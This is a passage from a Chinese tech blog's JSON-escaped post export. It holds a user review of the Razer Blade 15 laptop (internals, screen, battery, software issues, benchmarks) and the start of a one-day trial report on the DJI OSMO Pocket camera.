src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 